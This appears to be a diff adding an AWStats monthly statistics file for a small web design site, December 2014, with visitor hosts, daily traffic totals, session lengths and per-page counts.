+61.135.190.104 1 8 94642 20141207092723
+108.cmcd-186-66-212.gye.satnet.net 1 34 620627 20141208054757
+google-proxy-66-249-83-228.google.com 0 6 40066 
+unknown.ord.scnet.net 1 1 5177 20141203041752
+187-127-20-110.user.veloxzone.com.br 1 34 620632 20141204214234
+178.32.6.201 1 1 27747 20141205085151
+177.129.176.32 1 34 620630 20141213014458
+167-160-109-249.contina.com 1 1 6077 20141216235137
+219.95.78.13 1 1 8822 20141217150637
+host-2-99-72-162.as13285.net 1 34 620629 20141206232801
+61.135.190.102 1 24 280084 20141209011609
+51-159-13-177.skybandalarga.com.br 1 34 620630 20141224160811
+69.12.72.199.static.quadranet.com 1 1 6074 20141210232417
+189-015-228-050.xd-dynamic.ctbcnetsuper.com.br 1 34 620635 20141216064908
+69.58.178.57 10 10 332947 20141220012847
+ip-157-47.giganetinternet.com.br 1 34 620629 20141231081732
+50.100.109.187.ampernet.com.br 1 34 620630 20141224131151
+98.126.45.138.static.krypt.com 7 7 45736 20141231010217
+154.69.102.98 1 34 620633 20141229023412
+62-210-75-243.rev.poneytelecom.eu 1 8 94637 20141226230511
+c-n170-u0982-142.webazilla.com 2 4 30106 20141218082808
+static.69.201.76.144.clients.your-server.de 1 1 22369 20141209210023
+h046.helix.fastwebserver.de 1 1 22387 20141220223513
+189-82-105-137.user.veloxzone.com.br 1 28 535477 20141223023613
+yeiskport.ru 1 1 8050 20141203154123
+187.180.193.152 1 34 620625 20141205111004
+177.85.127.213 1 34 620629 20141207061509
+google-proxy-66-102-6-254.google.com 1 13 316185 20141218125259
+186.112.27.136 1 33 616070 20141206100825
+static.46.75.251.148.clients.your-server.de 1 1 22369 20141229051935
+reverse.214.5.207.91.reserver.ru 1 1 38701 20141225021652
+google-proxy-66-102-6-21.google.com 2 82 1297379 20141203234217
+i220-221-125-34.s05.a040.ap.plala.or.jp 1 34 620632 20141202234523
+phx1.phrixos.com 1 1 38701 20141210131423
+abs-static-178.177.102.118.aircel.co.in 1 35 626851 20141216003244
+google-proxy-66-249-88-168.google.com 2 123 2084618 20141219140050
+187-78-29-68.user.veloxzone.com.br 1 34 620631 20141201143703
+static.88-198-56-239.clients.your-server.de 3 3 66046 20141220132416
+bilby.builtwith.com 1 1 8824 20141210184613
+host182-86-dynamic.5-87-r.retail.telecomitalia.it 1 34 620634 20141208222946
+google-proxy-66-249-93-221.google.com 0 7 24965 
+179.180.83.211.dynamic.adsl.gvt.net.br 1 34 620634 20141211024721
+google-proxy-66-249-88-215.google.com 1 94 1796063 20141225204546
+herndon-45.lastpass.com 1 2 44819 20141221085052
+187-79-229-24.user.veloxzone.com.br 1 34 620630 20141212045557
+google-proxy-66-249-88-166.google.com 5 134 2066314 20141231023549
+179-96-253-49.outcenter.com.br 1 15 107457 20141227040004
+189-31-38-226.bsaco701.dsl.brasiltelecom.net.br 1 34 620632 20141209073319
+187-87-182-10.csnet.inf.br 1 33 591917 20141231095901
+93-43-251-50.ip94.fastwebnet.it 1 34 620631 20141201115741
+google-proxy-64-233-172-238.google.com 2 99 1473483 20141225152955
+msnbot-199-30-24-136.search.msn.com 0 35 617946 
+google-proxy-66-102-6-226.google.com 0 11 316202 
+google-proxy-64-233-172-199.google.com 3 106 1748110 20141223184502
+dns111240.phdns5.es 5 5 64672 20141207005442
+google-proxy-66-249-83-246.google.com 5 151 3504375 20141229004803
+199.15.233.185 1 1 35860 20141222063338
+google-proxy-66-249-83-138.google.com 5 167 4230245 20141231190453
+google-proxy-64-233-172-183.google.com 1 96 1873237 20141216114650
+host-88-135-157-94.icom.lv 1 34 620630 20141214230050
+107.181.170.155 1 1 38911 20141203225019
+google-proxy-66-249-93-224.google.com 2 9 130197 20141218044530
+google-proxy-66-102-6-235.google.com 0 15 95465 
+dsl.49.144.42.237.pldt.net 1 34 620631 20141214162942
+ec2-54-174-117-201.compute-1.amazonaws.com 1 1 38701 20141206205723
+d108-180-188-244.bchsia.telus.net 1 1 6076 20141206060229
+151.75.161.67 1 34 620631 20141203111746
+199.101.134.203 1 1 6416 20141210023537
+62-210-83-64.rev.poneytelecom.eu 1 1 35860 20141212050041
+200.191.11.177.multpontostelecom.com.br 1 27 571996 20141218124054
+google-proxy-66-249-84-138.google.com 3 42 1103110 20141227165458
+new-york.us 1 1 22220 20141225221401
+199.30.228.142 1 1 8816 20141227034035
+bzq-82-80-249-168.static.dcenter.bezeqint.net 1 1 8817 20141202230127
+177.236.40.45.cable.dyn.cableonline.com.mx 1 34 620633 20141217202124
+61.135.190.101 1 6 48097 20141204040847
+217.169.33.187.in-addr.arpa.mkanet.com.br 1 34 620638 20141227102537
+res_tce15872.ppp.twt.it 1 34 620622 20141204073152
+119.63.193.196 9 9 347545 20141229235426
+cust831-2.host-stage-dns.com 1 1 8825 20141214030751
+6.96.72.131.orixinet.com.br 1 25 356865 20141216235136
+50.115.168.136 2 2 16393 20141206134528
+host-89-241-103-223.as13285.net 3 65 1230890 20141224101336
+static.173.185.76.144.clients.your-server.de 2 2 45168 20141231034531
+178235013067.warszawa.vectranet.pl 1 1 38701 20141218235930
+4.red-176-84-89.dynamicip.rima-tde.net 1 34 620632 20141227125542
+ec2-54-89-26-172.compute-1.amazonaws.com 1 1 38701 20141227155621
+82.159.59.50.dyn.user.ono.com 1 34 620632 20141203012317
+bl16-116-206.dsl.telepac.pt 1 34 620628 20141216022851
+google-proxy-66-249-84-217.google.com 3 130 3026252 20141230005724
+187-24-117-248.3g.claro.net.br 1 31 611467 20141211105336
+sp-177-73-228-91-conectivainfor.com.br 1 34 620630 20141206133309
+baiduspider-220-181-108-163.crawl.baidu.com 1 1 8839 20141206224320
+192.187.99.194 2 2 17643 20141223111243
+104.143.12.42 2 2 71848 20141208114207
+177.222.55.213.dynamic.on.com.br 1 34 620633 20141222110252
+119.63.193.130 7 7 270251 20141227235234
+bfbf5dcb.virtua.com.br 1 34 620631 20141225103548
+46.4.153.211.hexcom.net 2 2 13474 20141215094916
+201-51-185-143.user.veloxzone.com.br 1 34 620632 20141212001413
+208.88.225.18 3 3 26472 20141210023509
+mail.s60.info 1 1 8822 20141217101742
+193.189.117.242.host.e-ring.pl 1 1 43431 20141228170122
+h060.helix.fastwebserver.de 3 3 67343 20141229145020
+212-129-39-182.rev.poneytelecom.eu 2 2 17641 20141230004842
+google-proxy-66-249-83-204.google.com 0 16 373753 
+190.7.112.9 1 34 620632 20141214134100
+120.197.234.166 1 1 8050 20141224032820
+google-proxy-66-249-84-223.google.com 3 132 2669184 20141224075040
+END_VISITOR
+
+# Date - Pages - Hits - Bandwidth - Visits
+BEGIN_DAY 31
+20141201 18 322 6442388 18
+20141202 50 195 3038579 17
+20141203 29 311 6084872 27
+20141204 31 279 4956395 21
+20141205 23 278 5463797 22
+20141206 36 216 3719909 31
+20141207 49 227 5076669 17
+20141208 19 191 3600546 19
+20141209 15 194 3862543 15
+20141210 66 282 5210974 35
+20141211 45 254 5067620 17
+20141212 13 277 5410754 13
+20141213 7 179 3523634 7
+20141214 13 221 4243116 13
+20141215 9 147 2828665 9
+20141216 46 474 8993089 36
+20141217 19 349 6736037 19
+20141218 13 277 5379690 13
+20141219 16 313 5439450 14
+20141220 43 317 6494502 33
+20141221 66 241 4074044 19
+20141222 29 204 4136966 21
+20141223 31 266 5035410 13
+20141224 23 315 6015323 21
+20141225 14 225 4318451 14
+20141226 11 155 3014253 11
+20141227 41 304 5839785 28
+20141228 20 96 1875400 10
+20141229 19 235 4871614 14
+20141230 38 242 4357231 16
+20141231 43 219 3918933 20
+END_DAY
+
+# Session range - Number of visits
+BEGIN_SESSION 7
+1h+ 1
+5mn-15mn 4
+0s-30s 561
+15mn-30mn 3
+30s-2mn 11
+2mn-5mn 2
+30mn-1h 1
+END_SESSION
+
+# URL - Pages - Bandwidth - Entry - Exit
+# The 10 first Pages must be first (order not required for others)
+BEGIN_SIDER 52
+/ 487 10368807 459 447
+/pricing 39 448269 19 22
+/contact 31 392836 4 6
+/faq-tips 29 512157 15 15
+/about-us 23 312594 1 1
+/FAQ/design 18 332372 8 6
+/portfolio 18 473147 6 4
+/FAQ/background-code 17 314265 0 1
+/portfolio/jon-stein 15 270490 11 11
+/portfolio/racecourse-garage-totnes 15 98330 8 8
+/package/starter 10 156591 1 4
+/user 5 25775 3 3
+/pricing/intermediate 4 37796 0 1
+/taxonomy/term/5/all/feed 1 1458 0 0
+/taxonomy/term/4/all/feed 1 1769 0 0
+/portfolio/ship-whale-pub 4 21285 2 2
+/portfolio/ewing-paddock 3 15730 1 1
+/portfolio/black-rabbit-retreat 3 33739 0 0
+/package/intermediate 8 181102 1 1
+/portfolio/mamarua-0 3 34197 1 1
+/portfolio/louise-purvis-sculpter 10 190190 9 8
+/user/password 1 5022 1 1
+/portfolio/seth-consedine-osteopath 6 86031 2 2
+/pricing/starter 5 42861 0 0
+/content/ana 6 31525 2 2
+/portfolio/daisy-coffins 3 16715 0 0
+/portfolio/richard-causton 2 10628 0 0
+/portfolio/halflight-music 3 15928 0 0
+/portfolio/playstation-totnes 5 32989 3 3
+/portfolio/maria-heseltine 5 61032 2 2
+/portfolio/motopccouk 2 10951 0 0
+/node 9 114250 9 9
+/portfolio/audio-post-production/+++++++++++++++++++Result:+%ED%E5+%ED%E0%F8%EB%EE%F1%FC+%F4%EE%F0%EC%FB+%E4%EB%FF+%EE%F2%EF%F0%E0%E2%EA%E8 1 43431 1 1
+/FAQ/think-your-own-user-experience-web 14 354627 2 4
+/portfolio/kirsty-winter-design-furniture 8 60096 0 0
+/portfolio/audio-post-production 11 126513 3 2
+/portfolio/bilingual-trips 2 10487 0 0
+/package/pro 7 120057 1 1
+/FAQ/what-seo-and-do-i-need-it 12 308235 0 2
+/taxonomy/term/6/all/feed 1 1071 0 1
+/portfolio/panyara 3 16049 1 1
+/portfolio/abconservation-0 4 38606 1 1
+/portfolio/racecourse-garage-totnes-racecourseremaposcom 1 6975 1 1
+/taxonomy/term/3/all/feed 1 1225 0 0
+/portfolio/kirsty-griffin-photographer 3 33408 1 1
+/pricing/pro 4 38168 0 0
+/portfolio/lovechefs 3 16042 0 0
+/FAQ/valuable-tool 9 234238 0 0
+/node/1/done 2 9528 0 2
+/faq/design 4 30708 1 2
+/content/maria 5 58020 2 2
+/package/custom 9 170433 1 1
+END_SIDER
